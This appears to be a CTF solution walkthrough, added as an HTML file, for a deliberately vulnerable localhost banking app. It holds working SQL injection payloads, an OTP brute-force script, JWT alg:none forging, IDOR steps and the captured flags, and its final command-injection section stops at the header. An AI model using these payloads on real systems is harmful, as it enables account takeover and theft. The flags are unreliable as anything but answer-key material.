@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BankSploit CTF — Full Exploitation Walkthrough</title>
+    <style>
+        :root {
+            --bg: #0b1120;
+            --card: #111827;
+            --border: #1e293b;
+            --text: #e2e8f0;
+            --muted: #94a3b8;
+            --accent: #f59e0b;
+            --green: #10b981;
+            --red: #ef4444;
+            --blue: #3b82f6;
+            --purple: #a78bfa;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            padding: 2rem;
+        }
+        .container { max-width: 1100px; margin: 0 auto; }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--accent), #f97316);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        .subtitle { color: var(--muted); font-size: 1rem; margin-bottom: 2rem; }
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1rem;
+            margin-bottom: 3rem;
+        }
+        .stat-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem;
+            text-align: center;
+        }
+        .stat-card .value { font-size: 2rem; font-weight: 900; color: var(--accent); }
+        .stat-card .label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; }
+
+        .vuln-section {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .vuln-section::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+        }
+        .vuln-section.tier-easy::before { background: linear-gradient(90deg, #10b981, #34d399); }
+        .vuln-section.tier-medium::before { background: linear-gradient(90deg, #3b82f6, #60a5fa); }
+        .vuln-section.tier-hard::before { background: linear-gradient(90deg, #f59e0b, #fbbf24); }
+
+        .vuln-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        .vuln-id {
+            font-size: 0.8rem;
+            font-weight: 700;
+            padding: 0.3rem 0.7rem;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .vuln-id.easy { background: #10b98120; color: #10b981; }
+        .vuln-id.medium { background: #3b82f620; color: #3b82f6; }
+        .vuln-id.hard { background: #f59e0b20; color: #f59e0b; }
+
+        .vuln-title { font-size: 1.4rem; font-weight: 700; }
+        .vuln-meta { display: flex; gap: 1rem; flex-wrap: wrap; }
+        .vuln-meta span {
+            font-size: 0.8rem;
+            padding: 0.2rem 0.6rem;
+            background: #1e293b;
+            border-radius: 4px;
+            color: var(--muted);
+        }
+        .vuln-meta .points { color: var(--accent); font-weight: 700; }
+
+        h3 { font-size: 1rem; font-weight: 700; color: var(--accent); margin: 1.5rem 0 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
+        p { margin-bottom: 1rem; color: var(--text); }
+        .step { margin-bottom: 1.5rem; }
+        .step-num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px; height: 24px;
+            background: var(--accent);
+            color: #000;
+            border-radius: 50%;
+            font-size: 0.75rem;
+            font-weight: 800;
+            margin-right: 0.5rem;
+        }
+        .step-label { font-weight: 600; font-size: 0.95rem; }
+
+        pre {
+            background: #0f172a;
+            border: 1px solid #1e3a5f;
+            border-radius: 10px;
+            padding: 1.25rem;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.82rem;
+            line-height: 1.6;
+            margin: 0.75rem 0 1.25rem;
+            color: #cbd5e1;
+        }
+        pre .comment { color: #64748b; }
+        pre .keyword { color: #f59e0b; }
+        pre .string { color: #34d399; }
+        pre .header-name { color: #60a5fa; }
+        pre .flag { color: #fbbf24; font-weight: 700; background: #f59e0b15; padding: 0.1rem 0.3rem; border-radius: 3px; }
+
+        .flag-box {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            background: #10b98115;
+            border: 1px solid #10b98140;
+            border-radius: 10px;
+            padding: 1rem 1.25rem;
+            margin: 1rem 0;
+        }
+        .flag-box .icon { font-size: 1.5rem; }
+        .flag-box .flag-value { font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--green); }
+        .flag-box .flag-status { font-size: 0.8rem; color: var(--green); margin-left: auto; }
+
+        .toc {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem 2rem;
+            margin-bottom: 3rem;
+        }
+        .toc h2 { font-size: 1.1rem; margin-bottom: 1rem; color: var(--accent); }
+        .toc ol { padding-left: 1.25rem; }
+        .toc li { margin: 0.4rem 0; }
+        .toc a { color: var(--blue); text-decoration: none; font-size: 0.9rem; }
+        .toc a:hover { text-decoration: underline; }
+        .toc .pts { color: var(--muted); font-size: 0.8rem; }
+
+        .note-box {
+            background: #1e3a5f20;
+            border: 1px solid #3b82f640;
+            border-radius: 10px;
+            padding: 1rem 1.25rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+        .note-box .icon { margin-right: 0.5rem; }
+
+        .toolkit {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem 2rem;
+            margin-bottom: 2rem;
+        }
+        .toolkit h2 { font-size: 1.1rem; margin-bottom: 1rem; color: var(--purple); }
+        .toolkit-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 0.75rem;
+        }
+        .toolkit-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            padding: 0.5rem;
+            border-radius: 6px;
+            background: #1e293b40;
+        }
+        .toolkit-item kbd {
+            background: #374151;
+            border: 1px solid #4b5563;
+            border-radius: 4px;
+            padding: 0.15rem 0.4rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            white-space: nowrap;
+        }
+        .toolkit-item .desc { color: var(--muted); }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: var(--muted);
+            font-size: 0.8rem;
+            border-top: 1px solid var(--border);
+            margin-top: 3rem;
+        }
+        @media (max-width: 768px) {
+            body { padding: 1rem; }
+            h1 { font-size: 1.8rem; }
+            pre { font-size: 0.72rem; padding: 0.75rem; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <h1>🏴 BankSploit CTF — Full Exploitation Walkthrough</h1>
+    <p class="subtitle">
+        Participant: <strong>BS100234</strong> (Rahul Sharma) &nbsp;|&nbsp;
+        Target: <code>http://localhost:9443/</code> &nbsp;|&nbsp;
+        Result: <strong style="color: var(--green);">8/8 flags captured — 2000/2000 points</strong>
+    </p>
+
+    <div class="stats-bar">
+        <div class="stat-card">
+            <div class="value">8/8</div>
+            <div class="label">Flags Captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="value">2000</div>
+            <div class="label">Points Earned</div>
+        </div>
+        <div class="stat-card">
+            <div class="value">100%</div>
+            <div class="label">Completion</div>
+        </div>
+        <div class="stat-card">
+            <div class="value">3</div>
+            <div class="label">Difficulty Tiers</div>
+        </div>
+    </div>
+
+    <!-- Browser Toolkit Reference -->
+    <div class="toolkit">
+        <h2>🧰 Browser Toolkit — Quick Reference</h2>
+        <p style="font-size:0.85rem; color:var(--muted); margin-bottom:1rem;">All challenges are solved using only the browser and its built-in Developer Tools. No terminal, no curl, no external scripts needed.</p>
+        <div class="toolkit-grid">
+            <div class="toolkit-item">
+                <kbd>F12</kbd>
+                <span class="desc">Open Developer Tools (or right-click → Inspect)</span>
+            </div>
+            <div class="toolkit-item">
+                <kbd>Network tab</kbd>
+                <span class="desc">See HTTP requests, response headers &amp; bodies</span>
+            </div>
+            <div class="toolkit-item">
+                <kbd>Sources tab</kbd>
+                <span class="desc">Inspect loaded JS files (find embedded data)</span>
+            </div>
+            <div class="toolkit-item">
+                <kbd>Console tab</kbd>
+                <span class="desc">Run JavaScript (fetch, decode, loops)</span>
+            </div>
+            <div class="toolkit-item">
+                <kbd>Elements tab</kbd>
+                <span class="desc">Edit HTML live (change input types, remove disabled)</span>
+            </div>
+            <div class="toolkit-item">
+                <kbd>Application tab</kbd>
+                <span class="desc">View &amp; edit cookies (session tokens, JWTs)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Table of Contents -->
+    <div class="toc">
+        <h2>📋 Table of Contents</h2>
+        <ol>
+            <li><a href="#l11">L11 — OTP Leaked in JavaScript File</a> <span class="pts">100 pts · Easy</span></li>
+            <li><a href="#g1">G1 — SQL Injection Login Bypass</a> <span class="pts">200 pts · Medium</span></li>
+            <li><a href="#l10">L10 — OTP Brute-Force (No Rate Limiting)</a> <span class="pts">200 pts · Medium</span></li>
+            <li><a href="#sl1">SL1 — IDOR View Other Users' Statements</a> <span class="pts">200 pts · Medium</span></li>
+            <li><a href="#l1">L1 — IDOR Transfer from Other Account</a> <span class="pts">300 pts · Hard</span></li>
+            <li><a href="#l12">L12 — JWT Algorithm None Privilege Escalation</a> <span class="pts">300 pts · Hard</span></li>
+            <li><a href="#g2">G2 — SQL Injection UNION Data Extraction</a> <span class="pts">300 pts · Hard</span></li>
+            <li><a href="#g9">G9 — Command Injection in PDF Export</a> <span class="pts">300 pts · Hard</span></li>
+        </ol>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 1: auth.l11 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-easy" id="l11">
+        <div class="vuln-header">
+            <span class="vuln-id easy">L11</span>
+            <span class="vuln-title">OTP Leaked in JavaScript File</span>
+            <div class="vuln-meta">
+                <span class="points">100 pts</span>
+                <span>CWE-209</span>
+                <span>Information Disclosure</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>When the OTP verification page loads, it includes a JavaScript file (<code>/public/js/otp-validation.js</code>) that contains the actual OTP value AND the flag embedded in a <code>SESSION_DATA</code> object. This file is dynamically served per-session — the server injects the real OTP into it. An attacker who inspects loaded scripts in DevTools will find both the OTP and the flag immediately.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Log in with valid credentials to reach the OTP page</span>
+            <p>Navigate to <code>http://localhost:9443/login</code>. Enter <code>BS100234</code> / <code>password123</code> and click <strong>Sign In</strong>. The OTP verification page appears.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Open DevTools and inspect loaded JavaScript files</span>
+            <p>Press <kbd>F12</kbd> → go to the <strong>Sources</strong> tab (or <strong>Network</strong> tab → filter by JS). Look for <code>otp-validation.js</code>. Click it to view its contents.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Find the OTP and flag in SESSION_DATA</span>
+            <p>Inside the JS file, search for <code>SESSION_DATA</code>. You'll find:</p>
+            <pre>var SESSION_DATA = {"_t":"otp","_v":"2.1.4",<span class="string">"_otp":"4823"</span>,<span class="flag">"_flag":"BANKSPLOIT{14AEF693F583}"</span>,"_sid":"abc123...","_exp":1720000000};</pre>
+            <p>The <code>_otp</code> field contains the OTP (use it to complete login). The <code>_flag</code> field contains the L11 flag.</p>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Alternative discovery:</strong> In the <strong>Network</strong> tab, click on the <code>otp-validation.js</code> request → <strong>Response</strong> sub-tab. Same content is visible there. The key insight is that JavaScript files loaded by a page can contain sensitive server-side data.
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{14AEF693F583}</span>
+            <span class="flag-status">✓ Found in JS file SESSION_DATA._flag</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 2: auth.g1 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-medium" id="g1">
+        <div class="vuln-header">
+            <span class="vuln-id medium">G1</span>
+            <span class="vuln-title">SQL Injection — Login Bypass</span>
+            <div class="vuln-meta">
+                <span class="points">200 pts</span>
+                <span>CWE-89</span>
+                <span>Authentication Bypass</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>The login form inserts the Customer ID directly into an SQL query without sanitization. By appending <code>' -- </code> (a SQL comment), you can terminate the query after the username match and skip the password check entirely. <strong>You must target a known, valid username</strong> — blind tautologies like <code>' OR '1'='1</code> are blocked.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Open DevTools Network tab</span>
+            <p>Press <kbd>F12</kbd> → <strong>Network</strong> tab (capture the POST response).</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Enter the SQL injection payload</span>
+            <p>On the login page, type in the <strong>Customer ID</strong> field:</p>
+            <pre>BS100234' -- </pre>
+            <p><strong>Important:</strong> There must be a space after <code>--</code>. The <strong>Password</strong> field can be anything (e.g. <code>x</code>).</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Click Sign In — the login succeeds without the real password</span>
+            <p>The SQL becomes: <code>WHERE customer_id = 'BS100234' -- ' AND password_md5 = '...'</code><br>
+            Everything after <code>--</code> is a comment. The password check is removed. You reach the OTP page.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Find the flag in the Network tab response headers</span>
+            <p>In the <strong>Network</strong> tab, click the POST request to <code>/login</code>. Go to <strong>Headers</strong> → <strong>Response Headers</strong>. You'll see:</p>
+            <pre><span class="header-name">X-CTF-Flag:</span> <span class="flag">BANKSPLOIT{B1AC0270D59E}</span></pre>
+            <p>The server detected SQL metacharacters in the Customer ID that resulted in a successful login — proof of injection.</p>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">⚠️</span> <strong>Why <code>' OR '1'='1</code> doesn't work:</strong> The server validates that the returned row's customer_id appears in your input. Tautologies return a random user whose ID isn't in your payload — so they're rejected. You MUST target a specific real username like <code>BS100234</code>.
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{B1AC0270D59E}</span>
+            <span class="flag-status">✓ X-CTF-Flag response header</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 3: auth.l10 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-medium" id="l10">
+        <div class="vuln-header">
+            <span class="vuln-id medium">L10</span>
+            <span class="vuln-title">OTP Brute-Force (No Rate Limiting)</span>
+            <div class="vuln-meta">
+                <span class="points">200 pts</span>
+                <span>CWE-307</span>
+                <span>Broken Authentication</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>The OTP verification endpoint has no rate limiting or lockout. The OTP is 4 digits (0000–9999), so an attacker can try all 10,000 combinations from the browser Console. The flag is returned in the response body when the correct OTP is submitted.</p>
+
+        <h3>How brute-force is guaranteed</h3>
+        <p>The OTP is a random 4-digit code generated server-side. It is NOT visible anywhere on the page, in the HTML source, or in any response body (the L11 JS leak is a separate vuln). The ONLY way to get the correct OTP at this challenge level is to try all possibilities — hence brute-force.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Log in to reach the OTP page</span>
+            <p>Go to <code>http://localhost:9443/login</code>, enter <code>BS100234</code> / <code>password123</code>, click <strong>Sign In</strong>. The OTP page appears.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Open Console and run the brute-force script</span>
+            <p>Press <kbd>F12</kbd> → <strong>Console</strong>. Paste and run:</p>
+            <pre><span class="comment">// Brute-force the 4-digit OTP via the login form endpoint</span>
+(async () => {
+  for (let i = 0; i &lt;= 9999; i++) {
+    const otp = String(i).padStart(4, '0');
+    const r = await fetch('/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'application/json'
+      },
+      body: 'otp=' + otp
+    });
+    if (r.headers.get('content-type')?.includes('json')) {
+      const d = await r.json();
+      if (d.ok) {
+        console.log('✅ OTP found:', otp);
+        console.log('🚩 Flag:', d.ctf_flag);
+        break;
+      }
+    }
+    if (i % 1000 === 0) console.log(`Tried ${i}/9999...`);
+  }
+})();</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Flag appears when the correct OTP is found</span>
+            <p>The script iterates until the correct OTP is hit. Output:</p>
+            <pre>Tried 0/9999...
+Tried 1000/9999...
+Tried 4000/9999...
+✅ OTP found: 4823
+🚩 Flag: <span class="flag">BANKSPLOIT{AB0ADD19226E}</span></pre>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Why this works:</strong> The <code>fetch()</code> runs in the same browser session (cookies auto-included). We send <code>Accept: application/json</code> so the server returns a JSON response with the flag instead of redirecting. No rate limiting means all 10,000 codes can be tried without lockout.
+        </div>
+
+        <div class="note-box">
+            <span class="icon">⚠️</span> <strong>Alternative (JSON API):</strong> You can also brute-force via <code>/api/v1/auth/verify-otp</code>:
+            <pre style="margin-top:0.5rem;"><span class="comment">// Alternative: use the JSON API endpoint</span>
+const r = await fetch('/api/v1/auth/verify-otp', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({otp: '1234'})
+});
+const d = await r.json();
+<span class="comment">// On success: d.ctf_flag contains the L10 flag</span></pre>
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{AB0ADD19226E}</span>
+            <span class="flag-status">✓ In JSON response body on correct OTP</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 4: statements.l1 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-medium" id="sl1">
+        <div class="vuln-header">
+            <span class="vuln-id medium">SL1</span>
+            <span class="vuln-title">IDOR — View Other Users' Statements</span>
+            <div class="vuln-meta">
+                <span class="points">200 pts</span>
+                <span>CWE-639</span>
+                <span>Insecure Direct Object Reference</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>The Statements page uses a <code>?account=</code> URL parameter containing the account number. The server resolves this to an account record <strong>without checking if the logged-in user owns it</strong>. By discovering another user's account number (from the Beneficiaries page) and putting it in the URL, you can view their transactions.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Discover another user's account number from Beneficiaries</span>
+            <p>After logging in, navigate to <strong>Transfer</strong> → look at the <strong>Beneficiary</strong> dropdown. It lists other users with their account numbers (e.g., <code>Priya Patel · 50100100000002 · HDFC0001234</code>). Note down an account number that isn't yours.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Open DevTools Network tab</span>
+            <p>Press <kbd>F12</kbd> → <strong>Network</strong> tab.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Navigate to Statements with the other user's account number</span>
+            <p>In the browser address bar, go to:</p>
+            <pre>http://localhost:9443/statements?account=50100100000002</pre>
+            <p>The page loads <strong>Priya's transactions</strong> — you can see her statement data even though you're logged in as Rahul.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Capture the flag from the response header</span>
+            <p>In the <strong>Network</strong> tab, click the request to <code>/statements?account=50100100000002</code>. Check <strong>Response Headers</strong>:</p>
+            <pre><span class="header-name">X-CTF-Flag:</span> <span class="flag">BANKSPLOIT{8A3F12D4E7B9}</span></pre>
+            <p>The server detected that you accessed an account belonging to a different user — confirmed IDOR.</p>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Discovery path:</strong> Account numbers are discoverable from the Beneficiaries shown in the Transfer page dropdown. These are pre-seeded references to other users' real accounts — exactly how a real bank exposes IDOR vectors.
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{...}</span>
+            <span class="flag-status">✓ X-CTF-Flag header on statements page</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 5: transfer.l1 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-hard" id="l1">
+        <div class="vuln-header">
+            <span class="vuln-id hard">L1</span>
+            <span class="vuln-title">IDOR — Transfer from Other Account</span>
+            <div class="vuln-meta">
+                <span class="points">300 pts</span>
+                <span>CWE-639</span>
+                <span>Insecure Direct Object Reference</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>The Transfer page shows a "From account" dropdown that is <strong>disabled</strong> (greyed out), with a hidden <code>&lt;input&gt;</code> submitting your own account ID. The server does NOT verify ownership of the from_account_id on the backend. By editing the hidden field to another user's account ID and completing the full transfer wizard, money is moved from their account.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Navigate to the Transfer page</span>
+            <p>After logging in, click <strong>Transfer</strong>. Notice the "From account" is greyed out (disabled) — you can't change it by clicking.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Inspect the form and find the hidden input</span>
+            <p>Press <kbd>F12</kbd> → <strong>Elements</strong> tab. Find the Transfer form. Look for:</p>
+            <pre>&lt;select disabled class="..."&gt;...&lt;/select&gt;
+&lt;input type="hidden" name="from_account_id" value="<span class="string">1</span>"&gt;</pre>
+            <p>The hidden input with <code>value="1"</code> is what actually gets submitted. The disabled select is cosmetic.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Change the hidden input value to another user's account ID</span>
+            <p>Double-click the <code>value="1"</code> in the Elements tab and change it to <code>4</code> (another user's account). You can discover valid account IDs from the Beneficiaries or by trying sequential numbers.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Complete the full transfer wizard</span>
+            <p>Select a beneficiary, enter an amount (₹1), click <strong>Continue</strong> → <strong>Confirm &amp; send OTP</strong> → enter the transfer OTP (brute-force it the same way as L10 if needed, or get it from the transfer OTP generator) → <strong>Authorise transfer</strong>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">5</span>
+            <span class="step-label">Capture the flag from the receipt response</span>
+            <p>In the <strong>Network</strong> tab, the final POST (the "verify" action) that shows the receipt has:</p>
+            <pre><span class="header-name">X-CTF-Flag:</span> <span class="flag">BANKSPLOIT{010B2A077ED2}</span></pre>
+            <p>The server detected that <code>from_account_id=4</code> doesn't belong to you — IDOR confirmed.</p>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Key insight:</strong> The disabled dropdown is a client-side restriction only. The server trusts the hidden input value without verifying ownership. This is a classic example of "client-side enforcement with no server-side validation."
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{010B2A077ED2}</span>
+            <span class="flag-status">✓ X-CTF-Flag header on transfer receipt</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 6: auth.l12 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-hard" id="l12">
+        <div class="vuln-header">
+            <span class="vuln-id hard">L12</span>
+            <span class="vuln-title">JWT Algorithm None — Privilege Escalation</span>
+            <div class="vuln-meta">
+                <span class="points">300 pts</span>
+                <span>CWE-347</span>
+                <span>Broken Access Control</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>After login, the app sets an <code>access_token</code> cookie containing a JWT. The server accepts <code>"alg": "none"</code> — meaning the token's signature is never verified. You can forge a JWT with <code>"role": "admin"</code> and access the secret <strong>Vault</strong> endpoint that only responds to admin-level tokens.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Log in and find your JWT cookie</span>
+            <p>Complete a full login. Open <kbd>F12</kbd> → <strong>Application</strong> tab → <strong>Cookies</strong> → your site. Find <code>access_token</code>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Decode it in the Console</span>
+            <pre><span class="comment">// Decode your JWT</span>
+const jwt = document.cookie.match(/access_token=([^;]+)/)[1];
+const [h, p] = jwt.split('.');
+console.log('Header:', JSON.parse(atob(h)));
+console.log('Payload:', JSON.parse(atob(p)));</pre>
+            <p>You'll see <code>alg: "none"</code> and <code>role: "user"</code>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Forge an admin JWT</span>
+            <pre><span class="comment">// Forge a JWT with role:admin and alg:none (no signature needed)</span>
+const hdr = btoa(JSON.stringify({alg:"none",typ:"JWT"})).replace(/=/g, '');
+const pay = btoa(JSON.stringify({
+  sub: "BS100234",
+  role: "admin",
+  iat: 1700000000,
+  exp: 1900000000
+})).replace(/=/g, '');
+const forged = hdr + '.' + pay + '.';
+console.log('Forged:', forged);</pre>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Access the admin-only Vault</span>
+            <pre><span class="comment">// Fetch the vault with the forged admin JWT</span>
+const r = await fetch('/api/v1/auth/vault', {
+  headers: {'Authorization': 'Bearer ' + forged}
+});
+const data = await r.json();
+console.log(data);</pre>
+            <p>Output:</p>
+            <pre>{
+  "ok": true,
+  "message": "🔓 Vault unlocked! You forged a valid admin JWT.",
+  <span class="flag">"flag": "BANKSPLOIT{AF9F3DBEC256}"</span>,
+  "user": "BS100234"
+}</pre>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">💡</span> <strong>Why fetch() is needed:</strong> The vault checks <code>Authorization: Bearer</code> — you can't navigate there in the address bar. Console <code>fetch()</code> is the browser-native way to set custom headers.
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{AF9F3DBEC256}</span>
+            <span class="flag-status">✓ In JSON response from /api/v1/auth/vault</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 7: statements.g2 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-hard" id="g2">
+        <div class="vuln-header">
+            <span class="vuln-id hard">G2</span>
+            <span class="vuln-title">SQL Injection — UNION Data Extraction</span>
+            <div class="vuln-meta">
+                <span class="points">300 pts</span>
+                <span>CWE-89</span>
+                <span>Data Exfiltration</span>
+            </div>
+        </div>
+
+        <h3>Vulnerability Description</h3>
+        <p>The Statements page date filter is vulnerable to SQL injection. Unlike G1 (bypass), this allows UNION-based injection to extract data from other database tables — including a <code>ctf_flags</code> table containing the G2 flag in hex-encoded form.</p>
+
+        <h3>Exploitation Steps</h3>
+
+        <div class="step">
+            <span class="step-num">1</span>
+            <span class="step-label">Navigate to Statements and change the date input type</span>
+            <p>Go to <strong>Statements</strong>. Right-click the <strong>"To"</strong> date field → <strong>Inspect</strong>. In Elements, change <code>type="date"</code> to <code>type="text"</code>. Press Enter.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">2</span>
+            <span class="step-label">Enter the UNION injection payload</span>
+            <p>In the now-editable "To" field, type:</p>
+            <pre>2099-01-01' UNION SELECT NULL,HEX(flag),NULL,NULL,NULL,NULL,NULL FROM ctf_flags WHERE user_id=1 -- </pre>
+            <p>Click <strong>Apply Filters</strong>.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">3</span>
+            <span class="step-label">Read the hex from the transaction table</span>
+            <p>A new row appears. The <strong>Description</strong> column shows a hex string like <code>42414E4B53504C4F49547B...</code>. Copy it.</p>
+        </div>
+
+        <div class="step">
+            <span class="step-num">4</span>
+            <span class="step-label">Decode the hex in the Console</span>
+            <pre><span class="comment">// Decode the hex string</span>
+const hex = '42414E4B53504C4F49547B3034313438373146363642387D';
+const flag = hex.match(/.{2}/g).map(h =&gt; String.fromCharCode(parseInt(h, 16))).join('');
+console.log(flag);</pre>
+            <p>Output: <code class="flag">BANKSPLOIT{0414871F66B8}</code></p>
+        </div>
+
+        <div class="note-box">
+            <span class="icon">⚠️</span> <strong>Why HEX() and position 2?</strong> Without HEX(), MySQL may throw a collation mismatch. Position 2 = Description column (position 1 is Date, which truncates to 10 chars).
+        </div>
+
+        <div class="flag-box">
+            <span class="icon">🚩</span>
+            <span class="flag-value">BANKSPLOIT{0414871F66B8}</span>
+            <span class="flag-status">✓ Extracted via UNION SELECT from ctf_flags table</span>
+        </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- VULNERABILITY 8: statements.g9 -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="vuln-section tier-hard" id="g9">
+        <div class="vuln-header">
+            <span class="vuln-id hard">G9</span>
+            <span class="vuln-title">Command Injection — PDF Export</span>
+            <div class="vuln-meta">
+                <span class="points">300 pts</span>
+                <span>CWE-78</span>
+                <span>Remote Code Execution</span>
+            </div>
+        </div>
+
